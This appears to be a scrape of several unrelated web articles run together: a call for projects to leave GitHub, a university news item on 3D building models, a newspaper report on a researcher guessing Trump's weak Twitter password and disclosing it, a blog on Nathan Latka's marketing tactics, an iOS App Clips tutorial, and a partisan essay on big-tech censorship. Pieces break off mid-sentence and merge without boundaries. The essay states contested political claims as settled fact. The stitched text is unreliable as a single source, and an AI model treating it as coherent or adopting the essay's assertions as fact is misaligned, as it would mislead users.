<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

UT PhD-student Shayan Nikoohemat created an algorithm that can accurately generate 3D models of the insides of large buildings from point clouds.</b></p><p>Indoor 3D models are the digital twins of building interiors. The 3D models could be used by first responders to get a good impression of large buildings, like shopping malls, a hospital or a sports complex, on their way to the emergency. 2D maps represent important information – like the location of emergency exits – on tangled floor plans, making them difficult too read quickly and after each reconstruction, these maps are outdated. “Sometimes, these maps are so outdated that the real building looks completely different than the floor plans. We need a fast and reliable approach to create the digital 3D model of interiors.”, says Shayan.</p><h2><a id="from-point-clouds-to-3d-map"></a>From point clouds to 3d map</h2><p>Luckily, laser scanners can quickly scan a whole building after every reconstruction. However, these scanners create point clouds, unstructured data which still has to be converted into a 3D model. The data doesn’t know if a scanned point is a wall, an exit or, for example, a table. According to Shayan, his program solved this: “For my PhD thesis, I created&nbsp;algorithms that automatically understand the data and can create 2D and 3D maps. We can detect and model doors, stairs, obstacles and navigable areas which are crucial data for the emergency planning.”</p><p><img src="https://1348661504.rsc.cdn77.org/.uc/ia68fda4b010288850e01584947034c146ab17af56d340701c4eb00bf0080/u4spzp0rofycx9foknvzw.png" alt="" width="235" height="191"><img src="https://1348661504.rsc.cdn77.org/.uc/i90ed1dbe010289850e01584947033c8b580b7352190d0701c4f300a40080/dmfesmsqurzdg6at3vcxgw.png" alt="" width="243" height="164"> </p><p><i>Figure 1: The point clouds and final 3D Model of the fire brigade building in Haaksbergen</i></p><h2><a id="recognizing-elements"></a>Recognizing elements</h2><p>The algorithm can recognize different structural elements such as walls, slabs, ceilings, and openings. Individual items like furniture, however, still pose a problem. “It is not yet able to correctly label everything, but the structural elements are enough to create an accurate map, which we tested on several real datasets,” he says. During his postdoc, he will further develop the system to also work for individual items. Huib Fransen of the Safety Region Rotterdam-Rijnmond was delighted with the results: “Shayan’s project is exciting for us and we were happy to provide him with the scanning sites for test cases.”&nbsp;</p><h2><a id="more-information"></a>MORE INFORMATION</h2><p>Shayan did his research and is now working as a postdoc at the Department of Earth Observation Sciences (EOS; Faculty ITC) and was supervised by Prof.Dr.Ir. M.G. Vosselman. His research project was initiated by the UT, TU Delft, and the Dutch FireBrigade (iNowit, Brandweer Nederland) and industry partners&nbsp;(CGI, Cyclomedia and Leap3D) and the Open Geospatial Consortium (OGC) to support disaster management in public buildings. The project was funded through&nbsp;<a href="http://maps4society.nl/">the NWO Partnership Programme Map4Society</a>. Shayan defended his PhD thesis, titled&nbsp;<i>Indoor 3D Reconstruction of Buildings from Point Clouds</i>, on 21 October.</p></div></div><div><div><p>K.W.

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

    <p>I consider Nathan to be one of my mentors even though I’ve <a href="https://sive.rs/ment">never talked to him</a>.</p>

<p>Okay, technically that’s not quite true. I exchanged Twitter DMs with him once. But this story is a perfect example of one of the key lessons I learned from him. So more on that in a moment.</p>

<p>And this last sentence is, in fact, a great example of one of the other lessons I learned from him (“Understand and leverage emotional triggers”). Apparently I’ve not just learned a thing or two from him but am also slowly able to implement the learning.</p>

<p>In case you wonder who Nathan Latka is, I created this little diagram.</p>

<p><img src="https://jakobgreenfeld.com/images/nathan_latka.svg" alt=""></p>

<p>Let’s dive in.</p>

<h2 id="build-the-attention-first-the-product-second">Build the attention first, the product second</h2>

<p>One of Nathan’s <a href="https://nathanlatka.com/60-second-blog-setup/">favorite mantras</a> is “Win peoples time and their money will follow.”</p>

<p>It’s always easy to read this kind of line, feel inspired, and then quickly forget about it. But Nathan learned the “attention first, product second” lesson through first-hand experiences and it’s obvious to what extent he’s internalized it.</p>

<p>He started his entrepreneurial journey by selling custom-made facebook pages. One thing he quickly noticed is just how hard it is to get the right kind of eyeballs onto your product.</p>

<p>His main job at the time was to negotiate with affiliates, bloggers and journalists, who had access to large distribution channels. And he hated doing this.</p>

<p>What further helped him to understand the power of media brands relative to actual products was <a href="https://www.goodreads.com/book/show/131533.Bloomberg_by_Bloomberg">Michael Bloombergs biography</a>.</p>

<p>Thus he decided that for his next venture it’ll be a much smarter approach to build the distribution channel first and pump the product later through it. This is exactly what he did.</p>

<p>He started a podcast, grew it for a few years and now offers relevant products to his audience.</p>

<blockquote>
  <p>“Wow, the real power here is not necessarily building a software company, but it’s building a media business that locks down distribution in the industry you want to own.”</p>
</blockquote>

<h2 id="anything-is-hackable">Anything is hackable</h2>

<p>Nathan is a hacker in the purest sense of the word. He always starts by studying what the most successful players are doing and all the implicit rules people follow, so that he can then break them systematically to achieve his goals.</p>

<p>Here’s, for example, how he approached his podcasting venture:</p>

<ul>
  <li>A key metric if you want to attract high-quality guests, sponsors and the attention of media outlets is the total number of downloads.</li>
  <li>To game this metric he decided to release lots of short episodes. Each of his episodes is just 15 minutes long and he releases a new episode each day. If you have 1000 episodes, you just need 1000 downloads per episode to reach the magical number of 1,000,000 total downloads.</li>
  <li>People discover new podcasts either by searching for specific terms or through top lists. After realizing this he developed a plan for each of the two discovery methods.</li>
  <li>Using Google Trends he learned that many people search for the term “top entrepreneur podcast”. Hence he simply called his podcast “The Top Entrepreneur Podcast”.</li>
  <li>He recorded 15 episodes before he launched. Then he sent an email to his guests that <a href="https://growthhackers.com/amas/upcoming-jan-21-ama-with-nathan-latka-10m-dl-podcast-host-wsj-best-selling-author-25k-copies-founder-saas-database-getlatka-com">said</a>: “I’m giving launch day priority to those who commit to emailing their list their episode. Will limit to 10 on launch day. You in?”. (This strategy is known as “elephant bumping”. To quote <a href="https://www.today.com/popculture/warren-buffett-billionaire-s-tell-all-bio-wbna26888245">Warren Buffet</a>: “Anytime a bunch of big shots get together you can get people to come, because it reassures them if they’re at an elephant-bumping that they’re an elephant too.”) Hence at launch day, he released ten episodes which were heavily advertised by his guests. In total, his podcast was mentioned on more than three million emails. This was enough to get the podcast into the top charts.</li>
</ul>

<p>He did similar things when he launched his <a href="https://www.nathanwlatka.com/magazine">magazine</a> and his <a href="http://book.nathanlatka.com/">book</a>.</p>

<p>There are also lots of smaller examples that demonstrate how Nathan tries to hack everything. For example, instead of linking to his Twitter profile and Youtube channel like everyone does, he uses a link that immediately asks anyone who clicks it if they want to follow him. For example, instead of <a href="https://twitter.com/NathanLatka">https://twitter.com/NathanLatka</a> he uses <a href="https://twitter.com/intent/user?screen_name=nathanlatka">https://twitter.com/intent/user?screen_name=nathanlatka</a>. And instead of <a href="https://www.youtube.com/user/NathanLatka">https://www.youtube.com/user/NathanLatka</a> he uses <a href="https://www.youtube.com/user/NathanLatka?sub_confirmation=1">https://www.youtube.com/user/NathanLatka?sub_confirmation=1</a>.</p>

<blockquote>
  <p>“I’m like, this is a new board game to play.”</p>
</blockquote>

<h2 id="leverage-everything-you-have">Leverage everything you have</h2>

<p>Nathan is a master at leveraging.</p>

<p>The fact that he sells products he created himself to his audience is just the most obvious example. He also, for example, always reaches out to all the CEOs he intereviewed on the podcast to get new ventures started. It was precisely by leverging this email list that allowed him to get his book and magazine started.</p>

<p>He leverages the podcast not just for distribution but also for product creation. For example, he simply created a spreadsheet with data points his podcast guests gave him and then sold it. And exactly the same data is used to fill pages in his magazine.</p>

<p>Another great example is that every time a writer appeared on his show, he took a screenshot of their Amazon sales rank at the day the podcast went live and the day before. He then used this proof that he can help to sell books to negotiate a great book deal.</p>

<p>Similarly, he leveraged a screenshot of his podcast’s ranking at launch day to secure new interview partners.</p>

<p>He’s also happy to trade appearances in his show, his magazine, his book (as described above), his email list, or on his Instagram account. For him, almost anything is something to barter with. For example, he trades Instagram posts for free hotel stays or rental cars and appearances in his podcast for keynotes at the events of his interview partners or email blasts.</p>

<p>And last but not least, he extensively uses software, virtual assistants, and systems he developed to leverage his own time as much as possible. More on that below.</p>

<blockquote>
  <p>“Like as long as you’ve got the sort of genes to not be scared to like swing, swing, swing, swing, swing. It’s just a matter of time before you hit that one thing that really works. You could have 99 things not work and one thing worked really well and that’s all you need. Everyone forgets about the things that don’t work. I mean, does anyone talk about the Amazon Fire Phone anymore that failed miserably?”</p>
</blockquote>

<h2 id="give-yourself-permission-to-dream-big">Give yourself permission to dream big</h2>

<blockquote>
  <p>“I’ve always thought that each person invented himself … that we are each a figment of our own imagination. The problem is, most people have no imagination.” - David Geffen</p>
</blockquote>

<p>This is a quote from Nathan’s book. And it leads to another perfect example of how he breaks an implicit rule everyone is living by.</p>

<p>Most people are afraid to dream big. And those few who dare to dream, do it in private. But not Nathan. He loves to set big, audacious goals and tell other people about them.</p>

<ul>
  <li>Before his podcast launched he emailed potential guests and told them that the show will have a million downloads by the end of the year. This was a somewhat audacious claim since he didn’t have a large following at the time. But by putting his big vision out there (and by working hard, of course) he was able to make it a reality.</li>
  <li>Before he had a book deal, he told the CEOs on his email list that it’ll be a massive bestseller. This way, he was able to convince some of them that an appearance in it was valuable and used this, as described below, to pre-sell his first copies.</li>
  <li>Before he launched his magazine, he reached out to his email list and <a href="https://www.indiehackers.com/podcast/171-nathan-latka-of-founderpath">told everyone</a> that “it’ll be the most expensive magazine in the world. Every VC is going to read it.” This convinced at least one of them that an appearance on its cover is valuable and hence led to his first magazine sales.</li>
</ul>

<p>Of course, it’s risky to make this kind of bold claims. But it’s only by making them that he was able to achieve what he promised. An example he gives is that he could easily use the money he earned by pre-selling his bestseller-to-be, to buy enough ads to turn it into a bestseller.</p>

<p>A strategy he recommends is to block off 10 minutes once a week just to write big dreams into a notebook. And once you’ve identified your big visions, you start putting them out there and capitalize on the momentum that starts building.</p>

<blockquote>
  <p>“You make things happen by how confidently you say them, and that’s key.”</p>
</blockquote>

<h2 id="understand-and-leverage-emotional-triggers">Understand and leverage emotional triggers</h2>

<p>Nathan recently published a <a href="https://www.indiehackers.com/post/how-my-side-project-hit-110-424-in-sales-9-tactics-3-scripts-5-hacks-d4ea9498fa">long case study</a> on Indie Hackers that started with:</p>

<blockquote>
  <p>“Even my mom laughed at me.
More on her in a second.”</p>
</blockquote>

<p>This is a perfect example of another lesson that Nathan has internalized: If you want people’s attention, curiosity is your best friend. The way to do this, as perfectly demonstrated in the opening lines above, is to create an open loop that directly correlates with whatever it is you’re trying to get attention on.  (In the copywriting community these are known as “curiosity gaps”.)</p>

<p>Just have a look at how the <a href="https://www.youtube.com/watch?v=OnupuW8wqGI">videos</a> on his YouTube channel start, or how his <a href="https://soundcloud.com/nathan-latka/unstack-cms-all-in-one-hits">podcast episodes</a> always start with snippets that make you curious.</p>

<p>Creating these curiosity loops is what he consideres to be one of his core competencies and one of the few things he wasn’t able to outsource so far.</p>

<p>And the focus on people’s curiosity is also apparent in all of his headlines and even his products.</p>

<ul>
  <li>A core element of his latest product, <a href="https://founderpath.com/">Founderpath</a>, is that it calculates a “SaaS Credit Score” for founders who sign up. It seems like a safe bet that people will be curious to know what their personal score is.</li>
  <li>A previous project, titled <a href="https://www.producthunt.com/posts/operation-pie">Operation Pie</a>, similarly offered SaaS founders to compare their statistics to those of 1000+ others.</li>
  <li>He came up with the idea to publish data tables at <a href="http://getlatka.com/">GetLatka.com</a> and his magazine because he noticed that it’s always this kind of content that sparkes his own curiosity when he browses other magazine like <a href="https://www.inc.com/magazine">Inc.</a>.</li>
</ul>

<p>Another emotional trigger that Nathan loves is people’s ego.</p>

<ul>
  <li>He pre-sold copies of his book by offering that if the CEO committed to spending $5,000 on copies, he’ll feature them in his book. He was able …</li></ul></div></div>

<![CDATA[How to Create App Clips for iOS 14]]>

October 22, 2020 | https://exyte.com/blog/how-to-create-app-clips | <a href="https://web.archive.org/web/*/https://exyte.com/blog/how-to-create-app-clips">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>At WWDC20 Apple showed many exciting updates and innovations, but my favourite addition this year has been App Clips. With our phones bursting with installed apps, App Clips could be the right solution for iOS users that prefer minimalism, and for many day to day use cases, such as ordering food in coffee shops, short-term renting or location-specific experiences (like shopping mall maps).</p>
<h2>Overview</h2>
<p>An app clip is a lightweight subset of your app, available as a part of the same Xcode project. Each app clip should perform its particular flow quickly and only when needed. One app can provide multiple app clip experiences configured with App Store Connect.</p>
<p>An app clip experience on your device usually starts with performing an invocation, which can be done by scanning a QR code, reading an NFC tag, etc. Since app clips are small parts of the app (&lt;10Mb), they can load very fast. If the user has the full application version installed, tapping the suggestion card on the screen will launch the app instead of the app clip.</p>
<p><img src="https://exyte.com/upload/Introducing-App-Clips-1.jpg" alt=""></p><p>Since the app clipâ€™s code is located in an additional target of your Xcode project, your full app can share existing UI components, code parts, and frameworks with app clips. However, app clips have some limitations due to preserving user privacy: according to documentation, CallKit, CloudKit, HealthKit, Speech, etc. are not available for an app clip use. You canâ€˜t access data from popular system apps such as Apple Music, Files, Reminders and Contacts. You can find full description of app clip limitations and available technologies on the <a rel="nofollow" href="https://developer.apple.com/documentation/app_clips/developing_a_great_app_clip">Apple Developer</a> portal.</p>
<h2>App Clip Discovery</h2>
<p>Users can discover an app clip in multiple ways. Each invocation type could be useful in different scenarios.</p>
<p><img src="https://exyte.com/upload/Introducing-App-Clips-2.jpg" alt=""></p><h3>App Clip Code</h3>
<p>This method might be the most interesting of all. As Apple states on their website, this code can contain an encoded URL and a NFC tag. At the time of writing (October 2020) we donâ€™t know how to create these codes - Apple will provide more information later this year.</p>
<h3>QR Code</h3>
<p>Using the Camera app or a barcode reader, users can scan codes to open an app clip card.</p>
<h3>NFC Tags</h3>
<p>By placing your phone near an NFC tag, you can invoke an app clip card even with a locked screen.</p>
<h3>Messages</h3>
<p>You can open a shared app clip from the Messages app.</p>
<h3>Place Cards</h3>
<p>An app clip can be associated with a place in Maps and invoked from its description.</p>
<h3>Smart App Banner</h3>
<p>You may have seen this banner in Safari, but additionally, it can suggest an app clip after updating configuration parameters.</p>
<h2>Creating an App Clip</h2>
<p>We will demonstrate adding app clips to an existing app because it might be the most popular use case. Here is an example scooter rental app written with SwiftUI that lets you select a scooter on the map and access a support chat.</p>
<p><img src="https://exyte.com/upload/1603369535663-rental-app-ui.png" alt=""></p><p>We created a simple model based on <strong>ObservableObject</strong> to store and update application data in runtime. Since we only wanted to demonstrate app clips features, there is no reason to setup a database and create a more traditional data layer. Instances of this model will be passed as an environment object to corresponding views.</p>

<p>The main screen is represented by a  <strong>MapView</strong> based on <strong>MKMapView</strong> from MapKit framework. Weâ€™ve implemented the <strong>UIViewRepresentable</strong> protocol and a <strong>Coordinator</strong> class to make <strong>MKMapView</strong> work as a SwiftUI view.</p>

<p>When the user selects a scooter on the map the app shows a popup view with rental details.</p>

<p>For the chat screen, we added a SwiftUI view with dummy content.</p>

<p>All these models and views are located in the project's shared folder, which means we can add them to both app and app clip targets.</p>
<p>The full Xcode project is available on <a rel="nofollow" href="https://github.com/exyte/app-clips-example">GitHub</a>. You can see the whole implementation and, of course, test it on your device. </p>
<h3>Add an App Clip Target</h3>
<p>First of all, you need to create a new target from the App Clip template. The overall process is quite simple.</p>
<p><img src="https://exyte.com/upload/app-clip-target-wizard-1.png" alt="">
<img src="https://exyte.com/upload/app-clip-target-wizard-2.png" alt=""></p><p>In order to handle the invocation URL parameters in your app clip, you need to add the Associated Domains Entitlement both to the app and app clip targets. If you are familiar with Universal Links, this process should be pretty easy. Donâ€™t forget to add <strong>applinks</strong> prefix to your associated domain name.</p>
<p><img src="https://exyte.com/upload/1603364905496-app-clip-target-app-links.png" alt=""></p><p>You need to apply configuration changes to the webserver too. Add an <code>appclips</code> dictionary with the app clip bundle identifier to your existing Apple App Site Association file.</p>

<p>Since we are going to reuse existing UI components, we need to add an active compilation condition to the app clip target. This value will allow us to separate parts of code not required for or not compatible with our app clips.</p>
<p><img src="https://exyte.com/upload/app-clips-target-conditions.png" alt=""></p><h3>Responding to Invocations</h3>
<p>As we mentioned earlier, to respond to user actions and show them the app clip state with correct invocation data, we need to handle the invocation URL in our SwiftUI App file. You can read more about <a href="https://developer.apple.com/documentation/app_clips/configuring_your_app_clip_s_launch_experience#3604126">the invocation URL structure</a> and its association with App Clip launch experience on the Apple Developer Portal. Apple did a great job of explaining this topic.
Because this code is only required for an app clip target, letâ€™s add an <strong>if</strong> condition with our <strong>APPCLIP</strong> value check.
In this code listing, we will implement a handler function for the <strong>webpageURL</strong> property of the <strong>NSUserActivity</strong> object. We will update our application data model after parsing the URL components path and query items.</p>

<p>In our case user can invoke the app clip with two possible URL paths:</p>
<ul>
<li><strong>/scooters?id={id}</strong> to select and show a scooter card by finding it using its identifier</li>
<li><strong>/help</strong> to access support chat</li>
</ul>
<p>Since our SwiftUI based components depend on the <strong>AppModel</strong> object data, the app will correctly handle updated properties and update its visual state.</p>
<h2>Testing App Clips</h2>
<p>Testing is an essential part of app clips development, and Apple provides various methods to do it.</p>
<h3>Environment Variable</h3>
<ul>
<li>Click on the active scheme selector in Xcode and select <strong>Edit Scheme</strong>.</li>
<li>Select and set <strong>_XCAppClipURL</strong> environment variable value with the required URL.
<img src="https://exyte.com/upload/app-clip-testing-environment-variable.png" alt=""></li>
<li>Run the app on the device or simulator to test app clip invocation.</li>
</ul>
<h3>Testflight</h3>

<h3>Local Experiences</h3>
<p>This method is only available on iOS 14.2 (or above) and Xcode 12.2. Local Experiences behave the same way as Advanced Experiences in App Store Connect.</p>
<ul>
<li>Make sure that your device is in developer mode.</li>
<li>On you device open <strong>Settings</strong> and select <strong>Developer</strong>.</li>
<li>Go to <em>Local Experiences</em> and select <strong>Register Local Experience</strong>.</li>
</ul>
<p>Here you can setup your app clip invocation properties the same way as in App Store Connect.</p>
<p><img src="https://exyte.com/upload/app-clip-local-experiences.png" alt=""></p><p>After local experiences setup, open the Barcode scanner and scan the QR code with encoded invocation URL to present associated App Clip Card.</p>
<p><img src="https://exyte.com/upload/app-clip-invocation.png" alt=""></p><p>We hope this tutorial will help you discover the potential of app clips experience for your current or future apps. We recommend you take a look at <a rel="nofollow" href="https://developer.apple.com/app-clips/">App Clips documentation</a> on the Apple Developer portal to find out more information about various aspects of setting up app clips.</p>
<p>To sum it up, here is a small video where you can see how app clips can be useful in a real-world scenario.</p>

<p><em>This article was written by Brandon Smith</em></p>


<p>The issue of censorship by major tech companies is a precarious one, and I’m becoming increasingly suspicious of the nature of the debate. There are some complexities, but it can all be boiled down to this:</p>


<p>Big tech social media conglomerates argue that their websites are like any other private business and that they are protected from overt government interference by the US constitution. In other words, they have a right to platform or deplatform anyone they choose. Of course, this is the exact OPPOSITE of what most leftist groups have argued in the past when it comes to private businesses refusing to cooperate with people they disagree with on basic principle, such as LGBT activists, but let’s set that hypocrisy aside for now.</p>


<p>Social media companies have decided that the people they want to deplatform most are conservatives, along anyone else who disagrees with hard left ideologies such as social justice or the handling of the pandemic situation. Statements or content that run contrary to leftist philosophies are simply labeled “hate speech” or “conspiracy theory” and are erased.</p>


<p>Conservatives argue that big tech is a monopoly with far too much power, that social media should be treated more like a public resource or “town square” and that these companies are violating the free speech rights of conservatives by specifically targeting them for censorship. Many conservatives are also demanding that Donald Trump and the government step in to regulate or punish such companies for these actions.</p>


<p>The truth is that both sides are right, and both sides are wrong. The real solution to the problem requires a radical change in how we view the institution of corporations and how they interact with government, and it’s a solution I doubt ANY political official will consider, and that includes Trump.</p>


<p>Let me explain…</p>


<p>Social media and big tech do in fact represent a monopoly, but not in terms most people are familiar with. Instead of acting only as an economic monopoly controlling market share, big tech is also a political monopoly controlling the majority of communication platforms. If only one political and social ideological group dominates every major social media and digital information outlet, this in my view represents a completely unbalanced power dynamic that does indeed threaten the free speech rights of the populace.</p>


<p>Rabid censorship of the Hunter Biden laptop scandal, a scandal that is supported by facts and evidence that big tech has chosen to bury because it’s inconvenient to them rather than a violation of their community guidelines, is just one more example of the incredible danger that social media monopolies present.</p>


<p>Obviously, there is the issue of private property rights to consider. I fully support and defend private property rights and I do believe that a business has the freedom to refuse service to anyone for any reason. Just because you open your doors to the public does not mean the public now owns your labor. You should have the right to refuse labor whenever you wish.</p>


<p>If a business refuses a customer based merely on personal bias, then word is going to get around quickly and that business may lose a large number of potential buyers in the future (this is happening right now with multiple alternative social media companies on the rise). The free market should determine the fate of that business, not state or federal governments.</p>


<p>Government itself is an untrustworthy entity that craves a monopoly of power, and by handing government the authority to micromanage the policies and internal practices of web companies we might be trading the big tech monster for an even more dangerous governmental monster.</p>


<p>Who is to say that the government will stop with sites like Facebook or Twitter or Google? Maybe they will exploit their newfound powers to go after smaller websites as well. Maybe they will attempt to micromanage the entire internet. Maybe they will start dominating and restricting conservative websites instead of the leftist conglomerates we intended, and then we will be doubly screwed.</p>


<p>If you value freedom and the Bill of Rights, then this debate leaves us at an impasse. Both sides (perhaps conveniently) lead to a totalitarian outcome. The thing is, the publicly presented argument is a contrived one, a manipulated discussion that only presents two sides when there are more options to consider. The narrative is fixed, it is a farce.</p>


<p>The public has been led to believe that government and corporations are separate tools that can be used to keep each side in check. This is a lie. Big government and big corporations have always worked together while pretending to be disconnected, and this needs to stop if we are to ever defuse the political time bomb we now face.</p>


<p>To solve the social media censorship debacle we need to examine the very roots of corporations as entities. First, corporations as we know them today are a relatively new phenomenon. Adam Smith described the concept of a corporation as a “joint stock company” in his treatise ‘The Wealth Of Nations’, and stood against them as a threat to free market economics. He specifically outlined their history of monopoly and failure, and criticized their habit of avoiding responsibility for mistakes and crimes.</p>


<p>Joint stock companies were chartered by governments and given special protections from risk, as well as protection from civil litigation (lawsuits). But, they were supposed to be temporary business entities, not perpetual business entities. The point was to allow for the creation of a joint stock company to finish a particular job, such as building a railroad, and once the job was finished the company was dissolved and the government protections were no longer needed. Smith knew that if corporations were ever allowed to become permanent fixtures in an economy, they would result in disaster.</p>


<p>This is exactly what happened in 1886 when the Supreme Court allowed companies like Southern Pacific Railroad to use the 14<sup>th</sup> Amendment, which was supposed to protect the constitutional rights of newly freed slaves, as a loophole to declare corporations as “legal persons” with all the protections of an individual citizen. Not only that, but with limited liability, corporations actually became super-citizens with protections far beyond normal individuals. Corporations became the preeminent force in the world and it was their relationship with governments that made this possible.</p>


<p>This fact completely debunks today’s notion of what constitutes free markets. Corporations ARE NOT free market structures. They are, in fact, government chartered and government protected monopolies. They are SOCIALIST creations, not free market creations, and therefore they should not exist in a free market society at all.</p>


<p>The alternative option to corporations was for businesses to form “partnerships”, which did not enjoy protection from government, limited liability or the ability to form monopolies. When the owners of a partnership committed a crime, they could be personally held liable for that crime. When a corporation commits a crime, only the company as a vaporous faceless entity can be punished. This is why it is very rare to see company CEOs face prosecution no matter how egregious and catastrophic their actions.</p>


<p>Today, certain corporations continue to enjoy government protections while also enjoying government welfare. Meaning, these companies get a legal shield while also basking in the advantage of tax incentives and taxpayer dollars.</p>


